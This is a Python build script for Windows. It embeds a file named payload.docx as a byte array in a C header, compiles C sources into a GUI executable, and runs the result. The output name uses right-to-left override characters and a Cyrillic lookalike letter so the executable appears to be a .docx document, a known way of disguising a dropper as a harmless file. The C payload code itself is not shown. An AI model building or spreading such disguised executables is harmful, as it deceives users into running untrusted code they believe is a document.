import os
import ntpath
import subprocess



if (ntpath.exists("build")):
	os.system("rmdir /s /q .\\build")
os.mkdir("build")
ti,tp,os.environ["INCLUDE"],os.environ["PATH"]=os.environ["INCLUDE"],os.environ["PATH"],".;"+os.environ["INCLUDE"],"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.28.29333\\bin\\Hostx64\\x64;"+os.environ["PATH"]
b_fp=os.getcwd()
os.chdir("build")
with open("../rsrc/payload.docx","rb") as f:
	dt=f.read()
with open("payload.h","w") as f:
	f.write(f"#ifndef __PAYLOAD_H__\n#define __PAYLOAD_H__\n#include <stdint.h>\n\n\n\nstatic const uint8_t PAYLOAD[]={{\n")
	i=0
	while (i<len(dt)):
		f.write(f"\t{', '.join(['0x'+hex(e)[2:].rjust(2,'0') for e in dt[i:i+6]])}{(',' if i+6<len(dt) else '')}\n")
		i+=6
	f.write(f"}};\n\n\n\nstatic const uint32_t PAYLOAD_SIZE={len(dt)};\n\n\n\n#endif\n")
if (subprocess.run(["cl","/c","/permissive-","/GS","/W3","/Zc:wchar_t","/Gm-","/sdl","/Zc:inline","/fp:precise","/D","NDEBUG","/D","_WINDOWS","/D","_UNICODE","/D","UNICODE","/errorReport:none","/WX","/Zc:forScope","/Gd","/Oi","/FC","/EHsc","/nologo","/diagnostics:column","/GL","/Gy","/Zi","/O2","/Oi","/MD","../src/*.c"]).returncode==0 and subprocess.run(["rc","/r","/fo","resource.res","/nologo","../resource.rc"]).returncode==0 and subprocess.run(["link","*.obj","*.res","/OUT:what_is_an_\u202ex\u0441od\u202e.exe","/DYNAMICBASE","user32.lib","shell32.lib","shlwapi.lib","/MACHINE:X64","/SUBSYSTEM:WINDOWS","/ERRORREPORT:none","/NOLOGO","/TLBID:1","/WX","/LTCG","/OPT:REF","/INCREMENTAL:NO","/OPT:ICF","/LARGEADDRESSAWARE"]).returncode==0):
	os.system("del *.obj&&del *.pdb&&del *.h&&del *.res&&cls")
	subprocess.run(["what_is_an_\u202ex\u0441od\u202e.exe"])
os.chdir(b_fp)
os.environ["INCLUDE"],os.environ["PATH"]=ti,tp
